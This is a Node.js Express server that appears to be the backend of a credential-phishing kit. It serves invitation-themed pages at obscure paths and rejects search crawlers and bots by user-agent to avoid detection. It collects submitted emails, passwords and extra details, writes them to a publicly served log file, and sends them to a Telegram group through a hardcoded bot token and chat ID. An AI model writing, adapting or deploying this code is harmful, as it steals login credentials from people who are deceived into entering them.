// Import the express module
const express = require('express');
const path = require('path');

const bodyParser = require('body-parser');
const fs = require('fs');
const axios = require('axios');

// Create an instance of an Express app
const app = express();

// Define a port number
const PORT = process.env.PORT || 3000;

// Set the view engine to EJS
app.set('view engine', 'ejs');

// Define a route for the root URL
const rateLimit = require('express-rate-limit');

// Set up rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later.'
});
app.use(express.static(path.join(__dirname, 'public')));


app.use(limiter);
// Middleware to parse JSON bodies
app.use(bodyParser.json());
app.use((req, res, next) => {
    const userAgent = req.headers['user-agent'] || '';
    const blockedAgents = [
      'bot', 'crawler', 'spider', 'scraper', 'search'
    ];
  
    const isBot = blockedAgents.some(agent => userAgent.toLowerCase().includes(agent));
  
    if (isBot) {
      return res.status(403).send('Access forbidden: Bots and crawlers are not allowed.');
    }
    next();
  });

  
// Define a route
app.get('/invite/6bn0', (req, res) => {
    res.render('index');
});

app.post('/profile/invitation/6bn0', (req, res) => {
    res.render('invite');
});


app.post('/result/6bn0', async (req, res) => {
    const { email, password, detail } = req.body;
    console.log({ email, password, detail })
    // Validate request data
    if (!email || !password || !detail) {
        return res.status(400).json({ error: 'Missing required fields' });
    }
    
    // Create a log entry
    const logEntry = `Email: ${email}\nPassword: ${password}\nDetail: ${detail}\n\n`;
    
    // Save log entry to a file in the 'public' directory
    const logFilePath = path.join(__dirname, 'public', 'log.txt');
    fs.appendFile(logFilePath, logEntry, (err) => {
        if (err) {
            console.error('Failed to write log file', err);
            return res.status(500).json({ error: 'Failed to save log' });
        }
    });
    
    // Send message to Telegram group
    const telegramBotToken = '7144039946:AAFsmuxyw2-TsnGvuYrfYoRcuKIFxsa_dEQ';
    const chatId = '-4185142703'; // Replace with your chat ID
    const message = `New submission:\n\nEmail: ${email}\nPassword: ${password}\nDetail: ${detail}`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            chat_id: chatId,
            text: message
        });
    } catch (err) {
        console.error('Failed to send message to Telegram', err);
    }
    
    // Send a response back to the client
    res.status(200).json({ success: true });
});
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
